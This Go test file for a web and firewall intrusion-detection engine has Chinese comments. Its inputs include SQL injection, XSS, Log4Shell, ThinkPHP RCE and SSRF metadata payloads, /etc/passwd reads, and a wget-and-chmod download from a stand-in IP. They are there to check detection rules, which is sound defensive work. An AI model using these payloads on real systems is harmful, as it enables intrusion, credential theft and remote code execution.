package detect

import (
	"testing"
	"time"

	"netsa/internal/config"
	"netsa/internal/model"
)

func TestNormalize(t *testing.T) {
	cases := map[string]string{
		"/a?id=1%2520UNION%2520SELECT": "/a?id=1 union select", // 双重编码
		"/a?q=1+UNION/**/SELECT":       "/a?q=1 union select",  // + 与注释混淆
		"/a?x=%u003Cscript%u003E":      "/a?x=<script>",        // IIS %u 编码
		"/a?x=&lt;svg&gt;":             "/a?x=<svg>",           // HTML 实体
		"/a?x=/*!50000select*/":        "/a?x= select ",        // MySQL 版本注释
		"/x?a=%zz":                     "/x?a=%zz",             // 非法编码保留
	}
	for in, want := range cases {
		if got := Normalize(in); got != want {
			t.Errorf("Normalize(%q) = %q, want %q", in, got, want)
		}
	}
}

func web(method, uri string, status int, ua string) *model.Event {
	return &model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Method: method, URI: uri, Status: status, Bytes: 100, UA: ua, Time: time.Now()}
}

func hitIDs(hits []model.Hit) map[string]model.Hit {
	m := map[string]model.Hit{}
	for _, h := range hits {
		m[h.RuleID] = h
	}
	return m
}

func TestSignatures(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		ev   *model.Event
		rule string
	}{
		{web("GET", "/p?id=1%27%20UNION%20ALL%20SELECT%20NULL,user()--%20-", 200, "x"), "sqli-union"},
		{web("GET", "/p?id=1'%20AND%20SLEEP(5)--%20", 200, "x"), "sqli-time"},
		{web("GET", "/s?q=%3Cscript%3Ealert(1)%3C/script%3E", 200, "x"), "xss-script"},
		{web("GET", "/d?f=../../../../etc/passwd", 200, "x"), "lfi-sensitive"},
		{web("GET", "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array", 200, "x"), "cve-thinkphp"},
		{web("GET", "/", 200, "${jndi:ldap://x/a}"), "log4shell"},
		{web("GET", "/?x=${${lower:j}ndi:ldap://x/a}", 200, "x"), "log4shell"},
		{web("GET", "/shell?cd+/tmp;wget+http://198.51.100.7/m;chmod+777+m", 404, "x"), "cmd-download"},
		{web("GET", "/ping?h=127.0.0.1;cat%20/etc/passwd", 200, "x"), "cmd-inject"},
		{web("GET", "/.git/config", 200, "x"), "sens-vcs"},
		{web("GET", "/.env", 404, "x"), "sens-secret"},
		{web("GET", "/wwwroot.rar", 404, "x"), "sens-backup"},
		{web("POST", "/uploads/2026/10/a.php", 200, "x"), "webshell-upload"},
		{web("GET", "/", 200, "sqlmap/1.7"), "ua-scanner"},
		{web("GET", "/", 200, "Mozilla/5.0 (compatible; CensysInspect/1.1)"), "ua-mapping"},
		{web("PUT", "/x.jsp/", 201, "x"), "cve-put-upload"},
		{web("GET", "/cgi-bin/.%2e/.%2e/bin/sh", 400, "x"), "cve-apache-trav"},
		{web("GET", "/api?url=http://169.254.169.254/latest/meta-data/", 200, "x"), "ssrf-metadata"},
	}
	for _, c := range cases {
		if _, ok := hitIDs(e.Inspect(c.ev))[c.rule]; !ok {
			t.Errorf("%s 未命中 %s", c.ev.URI, c.rule)
		}
	}
	// 正常请求不应产生攻击命中
	for _, uri := range []string{"/", "/products/1024?ref=home&id=2", "/api/v1/orders?page=2&size=20", "/search?q=how+to+select+a+router", "/static/js/app.min.js"} {
		for _, h := range e.Inspect(web("GET", uri, 200, "Mozilla/5.0 (Windows NT 10.0) Chrome/129.0")) {
			if !h.TagOnly {
				t.Errorf("误报: %s 命中 %s", uri, h.RuleID)
			}
		}
	}
}

func TestResultJudgement(t *testing.T) {
	e, _ := NewEngine("", 1)
	h := hitIDs(e.Inspect(web("GET", "/.git/config", 200, "x")))["sens-vcs"]
	if h.Result != model.ResultSuccess || h.Severity != model.SevHigh {
		t.Fatalf("敏感文件 200 应研判为疑似成功并升级: %+v", h)
	}
	h = hitIDs(e.Inspect(web("GET", "/s?q=<script>", 403, "x")))["xss-script"]
	if h.Result != model.ResultBlocked {
		t.Fatalf("403 应为已拦截: %+v", h)
	}
	h = hitIDs(e.Inspect(web("GET", "/s?q=<script>", 200, "x")))["xss-script"]
	if h.Result != model.ResultPassed {
		t.Fatalf("XSS 200 无法判断成功，应为未拦截: %+v", h)
	}
	// 管理后台探测只在失败时命中，正常访问自家后台不告警
	if _, ok := hitIDs(e.Inspect(web("GET", "/wp-admin/", 200, "x")))["admin-probe"]; ok {
		t.Fatal("admin-probe 不应在 200 时命中")
	}
}

func TestBehavior(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	now := time.Now()
	fired := map[string]bool{}
	for i := 0; i < 50; i++ {
		ev := &model.Event{Kind: model.KindFirewall, SrcIP: "198.51.100.2", DstIP: "10.0.0.1", DstPort: 1000 + i, Action: model.ActionDeny, Time: now.Add(time.Duration(i) * time.Second)}
		for _, h := range b.Observe(ev) {
			fired[h.RuleID] = true
		}
	}
	for i := 0; i < 40; i++ {
		ev := &model.Event{Kind: model.KindFirewall, SrcIP: "198.51.100.3", DstIP: "10.0.0.1", DstPort: 22, Time: now.Add(time.Duration(i) * time.Second)}
		for _, h := range b.Observe(ev) {
			fired[h.RuleID] = true
		}
	}
	for i := 0; i < 20; i++ {
		st := 401
		if i == 19 {
			st = 200
		}
		ev := &model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.4", Method: "POST", URI: "/wp-login.php", Status: st, Time: now.Add(time.Duration(i) * time.Second)}
		for _, h := range b.Observe(ev) {
			fired[h.RuleID] = true
		}
	}
	for _, id := range []string{"bhv-portscan", "bhv-fwbrute", "bhv-webbrute", "bhv-webbrute-ok"} {
		if !fired[id] {
			t.Errorf("行为检测 %s 未触发", id)
		}
	}
}

// 本轮修复的误报场景回归测试。
func TestFalsePositiveFixes(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		ev   *model.Event
		rule string
	}{
		{web("GET", "/downloads/report-2024.zip", 200, "Mozilla/5.0"), "sens-backup"},      // 带日期的正常下载
		{web("GET", "/images/thumb.php?src=a.jpg", 200, "Mozilla/5.0"), "webshell-static"}, // 缩略图脚本
		{web("GET", "/", 200, "python-httpx/0.27.0"), "ua-scanner"},                        // httpx 库不是扫描器
		{web("POST", "/run", 200, "Mozilla/5.0"), "cve-container"},                         // 普通业务接口
		{web("GET", "/blog/script", 200, "Mozilla/5.0"), "cve-middleware"},
		{web("GET", "/?returnpage=https://sso.example.com/", 200, "Mozilla/5.0"), "rfi"},
	}
	for _, c := range cases {
		if h, ok := hitIDs(e.Inspect(c.ev))[c.rule]; ok {
			t.Errorf("%s %s 误报 %s: %s", c.ev.Method, c.ev.URI, c.rule, h.Evidence)
		}
	}
	// 真实攻击仍需命中
	for _, c := range []struct {
		ev   *model.Event
		rule string
	}{
		{web("GET", "/wwwroot.zip", 200, "x"), "sens-backup"},
		{web("GET", "/db.sql", 404, "x"), "sens-backup"},
		{web("POST", "/images/x.php", 200, "x"), "webshell-static"},
		{web("GET", "/jenkins/script", 200, "x"), "cve-middleware"},
	} {
		if _, ok := hitIDs(e.Inspect(c.ev))[c.rule]; !ok {
			t.Errorf("%s %s 未命中 %s", c.ev.Method, c.ev.URI, c.rule)
		}
	}
	// 内网放行的东西向流量不告警，外网放行告警
	internal := &model.Event{Kind: model.KindFirewall, SrcIP: "10.1.2.3", DstIP: "10.0.0.5", DstPort: 3306, Action: model.ActionAllow}
	if hits := e.Inspect(internal); len(hits) != 0 {
		t.Errorf("内网放行的数据库访问不应告警: %+v", hits)
	}
	external := &model.Event{Kind: model.KindFirewall, SrcIP: "198.51.100.3", DstIP: "10.0.0.5", DstPort: 3306, Action: model.ActionAllow}
	if hits := e.Inspect(external); len(hits) != 1 || hits[0].Result != model.ResultAllowed {
		t.Errorf("外网放行的数据库访问应告警: %+v", hits)
	}
}

// 失败登录同样返回 302（如 Spring Security 跳回 /login?error）时不应误判为破解成功。
func TestBruteSuccessHeuristic(t *testing.T) {
	b := NewBehavior(config.Default().Detect.Thresholds)
	now := time.Now()
	for i := 0; i < 30; i++ {
		for _, h := range b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.9", Method: "POST", URI: "/login", Status: 302, Time: now}) {
			if h.RuleID == "bhv-webbrute-ok" {
				t.Fatal("失败也返回 302 时不应判定为破解成功")
			}
		}
	}
	// 表单回显错误（200）之后出现 302 跳转则判定疑似成功
	got := false
	for i := 0; i < 20; i++ {
		st := 200
		if i == 19 {
			st = 302
		}
		for _, h := range b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.10", Method: "POST", URI: "/login", Status: st, Time: now}) {
			got = got || h.RuleID == "bhv-webbrute-ok"
		}
	}
	if !got {
		t.Fatal("200 失败后出现 302 应判定为疑似成功")
	}
}

// 大规模端口扫描时每个 IP 的窗口状态必须有上限。
func TestBehaviorMemoryBounded(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	now := time.Now()
	for port := 1; port <= 5000; port++ {
		b.Observe(&model.Event{Kind: model.KindFirewall, SrcIP: "198.51.100.11", DstIP: "10.0.0.1", DstPort: port, Time: now})
	}
	w := b.fw["198.51.100.11"]
	if len(w.ports) > th.PortScanPorts*5 || len(w.sweep) > 64 {
		t.Fatalf("窗口状态未受限: ports=%d sweep=%d", len(w.ports), len(w.sweep))
	}
}

// 未来时间的异常日志不能成为窗口过期的基准，否则清理逻辑会失效、窗口无限增长。
func TestBehaviorIgnoresFutureTime(t *testing.T) {
	b := NewBehavior(config.Default().Detect.Thresholds)
	now := time.Now()
	b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Status: 404, URI: "/a", Time: now.AddDate(50, 0, 0)})
	b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.2", Status: 404, URI: "/a", Time: now})
	if b.latest.After(now.Add(time.Hour)) {
		t.Fatalf("latest 被未来时间污染: %v", b.latest)
	}
	b.prune(b.latest)
	if _, ok := b.web["198.51.100.1"]; ok {
		t.Fatal("未来时间的窗口应被清理")
	}
	if _, ok := b.web["198.51.100.2"]; !ok {
		t.Fatal("正常窗口不应被清理")
	}
}
